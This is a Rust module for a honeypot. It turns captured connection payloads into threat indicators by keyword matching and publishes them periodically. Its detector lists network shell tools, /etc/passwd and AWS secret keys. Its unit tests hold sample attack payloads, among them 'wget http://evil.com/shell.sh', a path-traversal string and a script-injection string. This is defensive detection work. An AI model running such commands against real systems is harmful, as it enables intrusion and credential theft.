use crate::honeypot_port::storage::HoneypotRecord;
use serde::{Deserialize, Serialize};

pub struct HoneypotIntelExtractor;

impl HoneypotIntelExtractor {
    pub fn extract_indicators(record: &HoneypotRecord) -> Vec<HoneypotIndicator> {
        let mut indicators = Vec::new();

        indicators.push(HoneypotIndicator {
            indicator_type: IndicatorType::SourceIp,
            value: record.remote_ip.clone(),
            severity: SeverityLevel::from_service(&record.service),
            description: format!(
                "Honeypot connection from {} to {} on port {}",
                record.remote_ip, record.service, record.local_port
            ),
            metadata: Some(record.payload_hex.clone()),
        });

        if let Some(ref pattern) = record.detected_pattern {
            indicators.push(HoneypotIndicator {
                indicator_type: IndicatorType::AttackPattern,
                value: pattern.clone(),
                severity: SeverityLevel::High,
                description: format!("Detected attack pattern: {}", pattern),
                metadata: Some(record.payload_hex.clone()),
            });
        }

        if let Ok(payload_str) = std::str::from_utf8(&record.payload) {
            let attack_types = Self::detect_attack_types(payload_str);
            for attack in attack_types {
                indicators.push(HoneypotIndicator {
                    indicator_type: IndicatorType::AttackVector,
                    value: attack.clone(),
                    severity: SeverityLevel::High,
                    description: format!("Attack vector detected: {}", attack),
                    metadata: Some(record.payload_hex.clone()),
                });
            }
        }

        indicators
    }

    fn detect_attack_types(payload: &str) -> Vec<String> {
        let mut attacks = Vec::new();
        let payload_lower = payload.to_lowercase();

        if payload_lower.contains("select ") && payload_lower.contains(" from ") {
            attacks.push("SQL Injection".to_string());
        }
        if payload_lower.contains("<script") || payload_lower.contains("javascript:") {
            attacks.push("XSS".to_string());
        }
        if payload_lower.contains("../") || payload_lower.contains("..\\") {
            attacks.push("Path Traversal".to_string());
        }
        if payload_lower.contains("/etc/passwd") || payload_lower.contains("/etc/shadow") {
            attacks.push("LFI".to_string());
        }
        if payload_lower.contains("wget ")
            || payload_lower.contains("curl ")
            || payload_lower.contains("nc ")
            || payload_lower.contains("ncat ")
        {
            attacks.push("Remote Code Execution Attempt".to_string());
        }
        if payload_lower.contains("bash") || payload_lower.contains("sh -") {
            attacks.push("Shell Command Injection".to_string());
        }
        if payload_lower.contains("phpinfo") || payload_lower.contains("<?php") {
            attacks.push("PHP Exploitation".to_string());
        }
        if payload_lower.contains("wp-admin") || payload_lower.contains("wp-login") {
            attacks.push("WordPress Attack".to_string());
        }
        if payload_lower.contains("admin") && payload_lower.contains("login") {
            attacks.push("Admin Panel Probe".to_string());
        }
        if payload_lower.contains(".git") || payload_lower.contains(".svn") {
            attacks.push("Version Control Leak".to_string());
        }
        if payload_lower.contains("aws_access_key") || payload_lower.contains("aws_secret") {
            attacks.push("AWS Credential Theft".to_string());
        }
        if payload_lower.contains("redis") && payload_lower.contains("config") {
            attacks.push("Redis Attack".to_string());
        }
        if payload_lower.contains("mongo") && payload_lower.contains("db") {
            attacks.push("MongoDB Attack".to_string());
        }

        attacks
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneypotIndicator {
    pub indicator_type: IndicatorType,
    pub value: String,
    pub severity: SeverityLevel,
    pub description: String,
    pub metadata: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum IndicatorType {
    SourceIp,
    AttackPattern,
    AttackVector,
    Payload,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SeverityLevel {
    Critical,
    High,
    Medium,
    Low,
}

impl SeverityLevel {
    pub fn from_service(service: &str) -> Self {
        match service.to_lowercase().as_str() {
            "ssh" | "telnet" | "mysql" | "redis" | "mongodb" | "elasticsearch" => {
                SeverityLevel::High
            }
            "http" | "https" => SeverityLevel::Medium,
            _ => SeverityLevel::Low,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::honeypot_port::storage::HoneypotRecord;

    fn make_record(service: &str, payload: &[u8], pattern: Option<String>) -> HoneypotRecord {
        HoneypotRecord {
            id: 1,
            timestamp: 1234567890,
            remote_ip: "192.168.1.100".to_string(),
            remote_port: 12345,
            local_port: 22,
            protocol: "tcp".to_string(),
            service: service.to_string(),
            payload: payload.to_vec(),
            payload_hex: hex::encode(payload),
            detected_pattern: pattern,
            bytes_received: payload.len() as u32,
            bytes_sent: 0,
            duration_ms: 100,
            connection_info: "192.168.1.100:12345".to_string(),
        }
    }

    #[test]
    fn test_extract_source_ip_indicator() {
        let record = make_record("ssh", b"", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        assert!(!indicators.is_empty());
        assert_eq!(indicators[0].indicator_type, IndicatorType::SourceIp);
        assert_eq!(indicators[0].value, "192.168.1.100");
    }

    #[test]
    fn test_extract_pattern_indicator() {
        let record = make_record("ssh", b"", Some("SSH-".to_string()));
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let pattern_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.indicator_type == IndicatorType::AttackPattern)
            .collect();

        assert!(!pattern_indicators.is_empty());
    }

    #[test]
    fn test_detect_sql_injection() {
        let record = make_record("http", b"SELECT * FROM users", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let sql_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("SQL"))
            .collect();

        assert!(!sql_indicators.is_empty());
    }

    #[test]
    fn test_detect_xss() {
        let record = make_record("http", b"<script>alert(1)</script>", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let xss_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("XSS"))
            .collect();

        assert!(!xss_indicators.is_empty());
    }

    #[test]
    fn test_detect_lfi() {
        let record = make_record("http", b"../../etc/passwd", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let lfi_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("Path Traversal"))
            .collect();

        assert!(!lfi_indicators.is_empty());
    }

    #[test]
    fn test_detect_command_injection() {
        let record = make_record("ssh", b"wget http://evil.com/shell.sh", None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        let cmd_indicators: Vec<_> = indicators
            .iter()
            .filter(|i| i.value.contains("Remote Code"))
            .collect();

        assert!(!cmd_indicators.is_empty());
    }

    #[test]
    fn test_severity_from_service() {
        assert_eq!(SeverityLevel::from_service("ssh"), SeverityLevel::High);
        assert_eq!(SeverityLevel::from_service("mysql"), SeverityLevel::High);
        assert_eq!(SeverityLevel::from_service("http"), SeverityLevel::Medium);
        assert_eq!(SeverityLevel::from_service("ftp"), SeverityLevel::Low);
    }

    #[test]
    fn test_multiple_attack_types() {
        let payload = b"SELECT * FROM users<script>alert(1)</script>../../etc/passwd";
        let record = make_record("http", payload, None);
        let indicators = HoneypotIntelExtractor::extract_indicators(&record);

        // Should detect multiple attack types
        assert!(indicators.len() >= 3);
    }
}

pub struct HoneypotThreatPublisher {
    storage: std::sync::Arc<crate::honeypot_port::HoneypotStorage>,
    last_publish: std::sync::Mutex<std::time::Instant>,
    publish_interval_secs: u64,
}

impl HoneypotThreatPublisher {
    pub fn new(
        storage: std::sync::Arc<crate::honeypot_port::HoneypotStorage>,
        publish_interval_secs: u64,
    ) -> Self {
        Self {
            storage,
            last_publish: std::sync::Mutex::new(std::time::Instant::now()),
            publish_interval_secs,
        }
    }

    pub fn should_publish(&self) -> bool {
        let last = *self.last_publish.lock().unwrap();
        last.elapsed().as_secs() >= self.publish_interval_secs
    }

    pub fn get_new_indicators(&self, since_timestamp: i64) -> Vec<HoneypotIndicator> {
        if let Ok(records) = self.storage.get_records_since(since_timestamp, 1000) {
            let mut all_indicators = Vec::new();
            for record in records {
                let indicators = HoneypotIntelExtractor::extract_indicators(&record);
                all_indicators.extend(indicators);
            }
            all_indicators
        } else {
            Vec::new()
        }
    }

    pub fn mark_published(&self) {
        *self.last_publish.lock().unwrap() = std::time::Instant::now();
    }
}
